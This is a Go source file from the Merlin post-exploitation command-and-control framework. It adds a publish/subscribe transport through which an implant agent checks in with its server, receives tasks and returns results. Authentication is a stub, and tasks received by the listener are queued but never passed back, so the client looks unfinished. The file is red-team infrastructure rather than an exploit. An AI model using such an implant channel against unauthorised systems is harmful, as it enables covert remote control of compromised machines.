/*
Merlin is a post-exploitation command and control framework.

This file is part of Merlin.
Copyright (C) 2023 Russel Van Tuyl

Merlin is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
any later version.

Merlin is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with Merlin.  If not, see <http://www.gnu.org/licenses/>.
*/

package main

import (
	"encoding/json"
	"fmt"
	"sync"
        "github.com/Ne0nd0g/merlin-message"
	"github.com/Ne0nd0g/merlin-agent/v2/core"
	"github.com/fatih/color"
)

// PubSubClient adapts the generic Transport to Merlin's clients.Client interface
type PubSubClient struct {
	transport *Transport
	agentID   string
	config    map[string]interface{}
	messages  chan interface{}
	mu        sync.Mutex
	running   bool
}

// NewPubSubClient creates a new pub/sub client for Merlin
func NewPubSubClient(cfg *Config, agentID string) (*PubSubClient, error) {
	transport, err := NewTransport(cfg)
	if err != nil {
		return nil, fmt.Errorf("failed to create pubsub transport: %w", err)
	}

	client := &PubSubClient{
		transport: transport,
		agentID:   agentID,
		config:    make(map[string]interface{}),
		messages:  make(chan interface{}, 100),
		running:   false,
	}

	return client, nil
}

// Authenticate performs authentication (not used for pub/sub, but required by interface)
func (p *PubSubClient) Authenticate(msg messages.Base) error {
	if core.Verbose {
		color.Green("[+] PubSub client authenticated")
	}
	return nil
}

// Get retrieves a configuration value
func (p *PubSubClient) Get(key string) string {
        p.mu.Lock()
        defer p.mu.Unlock()

        if val, ok := p.config[key]; ok {
                if str, ok := val.(string); ok {
                        return str
                }
        }
        return ""
}

// Set sets a configuration value
func (p *PubSubClient) Set(key string, value string) error {
        p.mu.Lock()
        defer p.mu.Unlock()
        p.config[key] = value
        return nil
}

// Initial sends the initial checkin message
func (p *PubSubClient) Initial() error {
	if core.Verbose {
		color.Cyan("[*] Sending initial checkin via PubSub")
	}

	// Create initial checkin message
	checkin := map[string]interface{}{
		"action":   "checkin",
		"agent_id": p.agentID,
	}

	// Send initial checkin
	err := p.transport.Send(checkin)
	if err != nil {
		if core.Verbose {
			color.Red(fmt.Sprintf("[-] Failed to send initial checkin: %s", err.Error()))
		}
		return fmt.Errorf("initial checkin failed: %w", err)
	}

	if core.Verbose {
		color.Green("[+] Initial checkin sent successfully")
	}

	return nil
}
// Listen starts listening for messages from the server
func (p *PubSubClient) Listen() ([]messages.Base, error) {
        p.mu.Lock()
        if p.running {
                p.mu.Unlock()
                return nil, fmt.Errorf("already listening")
        }
        p.running = true
        p.mu.Unlock()

        if core.Verbose {
                color.Cyan("[*] Starting PubSub listener")
        }

        // Start listening with a handler
        err := p.transport.Listen(func(task map[string]interface{}) map[string]interface{} {
                if core.Debug {
                        color.Yellow(fmt.Sprintf("[DEBUG] Received task: %v", task))
                }

                // Queue the message for processing
                p.messages <- task

                // Return nil - we'll send responses separately via Send()
                return nil
        })

        if err != nil {
                p.mu.Lock()
                p.running = false
                p.mu.Unlock()
                if core.Verbose {
                        color.Red(fmt.Sprintf("[-] Listen error: %v", err))
                }
                return nil, err
        }

        return []messages.Base{}, nil
}
// Send sends a message to the server
func (p *PubSubClient) Send(message messages.Base) ([]messages.Base, error) {
        if core.Debug {
                color.Yellow(fmt.Sprintf("[DEBUG] Sending message: %v", message))
        }

        // Convert messages.Base to map
        jsonBytes, err := json.Marshal(message)
        if err != nil {
                return nil, fmt.Errorf("failed to marshal message: %w", err)
        }

        var data map[string]interface{}
        err = json.Unmarshal(jsonBytes, &data)
        if err != nil {
                return nil, fmt.Errorf("failed to unmarshal message: %w", err)
        }

        // Send via transport
        err = p.transport.Send(data)
        if err != nil {
                return nil, fmt.Errorf("failed to send: %w", err)
        }

        if core.Verbose {
                color.Green("[+] Message sent successfully")
        }

        return []messages.Base{}, nil
}

// Synchronous returns whether this is a synchronous client (pub/sub is asynchronous)
func (p *PubSubClient) Synchronous() bool {
	return false
}

// Close closes the pub/sub client
func (p *PubSubClient) Close() error {
	if core.Verbose {
		color.Cyan("[*] Closing PubSub client")
	}

	p.mu.Lock()
	p.running = false
	p.mu.Unlock()

	close(p.messages)
	return p.transport.Close()
}
